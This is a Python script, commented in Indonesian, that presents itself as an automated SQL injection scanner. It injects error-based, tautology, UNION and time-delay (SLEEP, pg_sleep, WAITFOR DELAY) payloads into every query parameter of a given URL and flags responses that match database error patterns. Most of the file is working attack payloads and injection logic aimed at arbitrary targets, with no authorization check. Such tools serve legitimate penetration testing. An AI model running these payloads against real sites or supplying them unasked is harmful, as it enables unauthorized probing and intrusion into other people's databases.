#!/usr/bin/env python3
"""
SQL Injection Tester - Automated SQLi vulnerability scanner
Menguji parameter URL untuk kerentanan SQL Injection.
Usage: python sqli_tester.py -u "http://target.com/page?id=1"
"""

import requests
import argparse
import sys
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"valid MySQL result",
    r"MySqlClient\.",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpg_.*",
    r"valid PostgreSQL result",
    r"Npgsql\.",
    r"Driver.* SQL.*Server",
    r"OLE DB.* SQL Server",
    r"\bSQL Server.*Driver",
    r"Warning.*mssql_.*",
    r"\bSQL Server\b[^\n]*ERROR",
    r"Warning.*odbc_.*",
    r"\bORA-[0-9]{5}",
    r"Oracle error",
    r"Oracle.*ORA-",
    r"Microsoft Access.*Driver",
    r"JET Database Engine",
    r"Access Database Engine",
    r"SQLite/JDBCDriver",
    r"SQLite\.Exception",
    r"System\.Data\.SQLite\.SQLiteException",
    r"Warning.*sqlite_.*",
    r"Warning.*SQLite3::",
    r"SQLite3::query",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"SQL command not properly ended",
    r"PSQLException",
]

SQLI_PAYLOADS = [
    "'",
    "''",
    "`",
    "``",
    ",)",
    '"',
    '""',
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1 UNION SELECT NULL--",
    "1 UNION SELECT 1,2--",
    "1' AND '1'='1",
    "1' AND '1'='2",
    "1 AND 1=1",
    "1 AND 1=2",
    "' UNION SELECT @@version--",
    "'; WAITFOR DELAY '0:0:5'--",
    "1; SELECT pg_sleep(5)--",
    "admin'--",
    "admin' OR '1'='1",
    "1 OR 1=1#",
    "1' OR 1=1#",
    "1' OR '1'='1'#",
]

TIME_PAYLOADS = [
    ("' OR SLEEP(3)--", 3),
    ("' OR pg_sleep(3)--", 3),
    ("'; WAITFOR DELAY '0:0:3'--", 3),
    ("1' AND SLEEP(3)--", 3),
]


def normalize_url(url):
    parsed = urlparse(url)
    if not parsed.scheme:
        url = "http://" + url
        parsed = urlparse(url)
    return url, parsed


def get_params(url):
    parsed = urlparse(url)
    return parse_qs(parsed.query)


def test_error_based(session, url, params):
    findings = []
    base_params = params.copy()
    for param_name in base_params:
        original = base_params[param_name][0] if base_params[param_name] else "1"
        for payload in SQLI_PAYLOADS:
            test_params = base_params.copy()
            test_params[param_name] = original + payload
            test_url = inject_params(url, test_params)
            try:
                r = session.get(test_url, timeout=10)
                for pattern in ERROR_PATTERNS:
                    if re.search(pattern, r.text, re.IGNORECASE):
                        findings.append(
                            {
                                "type": "Error-based SQLi",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": pattern,
                            }
                        )
                        return findings
            except requests.exceptions.RequestException:
                continue
    return findings


def test_time_based(session, url, params):
    findings = []
    for param_name in params:
        for payload, delay in TIME_PAYLOADS:
            test_params = params.copy()
            test_params[param_name] = "1" + payload
            test_url = inject_params(url, test_params)
            start = time.time()
            try:
                session.get(test_url, timeout=delay + 5)
                elapsed = time.time() - start
                if elapsed >= delay:
                    findings.append(
                        {
                            "type": "Time-based SQLi",
                            "url": test_url,
                            "parameter": param_name,
                            "payload": payload,
                            "delay": elapsed,
                        }
                    )
                    return findings
            except requests.exceptions.RequestException:
                continue
    return findings


def inject_params(url, params):
    parsed = urlparse(url)
    query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=query))


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Tester")
    parser.add_argument("-u", "--url", required=True, help="Target URL with parameters")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout")
    parser.add_argument("--no-time", action="store_true", help="Skip time-based tests")
    args = parser.parse_args()

    url, parsed = normalize_url(args.url)
    params = get_params(url)

    if not params:
        print("[!] URL tidak memiliki parameter. Contoh: http://target.com/page?id=1")
        sys.exit(1)

    print(f"[*] Target: {url}")
    print(f"[*] Parameters ditemukan: {list(params.keys())}")
    print("-" * 60)

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 Security-Scanner"})

    print("[*] Testing Error-based SQLi...")
    findings = test_error_based(session, url, params)
    if findings:
        for f in findings:
            print(f"\n[!] VULNERABLE - {f['type']}")
            print(f"    URL: {f['url']}")
            print(f"    Parameter: {f['parameter']}")
            print(f"    Payload: {f['payload']}")
            print(f"    Evidence: {f['evidence']}")
    else:
        print("[*] Tidak ada error-based SQLi terdeteksi")

    if not args.no_time:
        print("\n[*] Testing Time-based SQLi...")
        findings = test_time_based(session, url, params)
        if findings:
            for f in findings:
                print(f"\n[!] VULNERABLE - {f['type']}")
                print(f"    URL: {f['url']}")
                print(f"    Parameter: {f['parameter']}")
                print(f"    Delay: {f['delay']:.2f}s")
        else:
            print("[*] Tidak ada time-based SQLi terdeteksi")


if __name__ == "__main__":
    main()
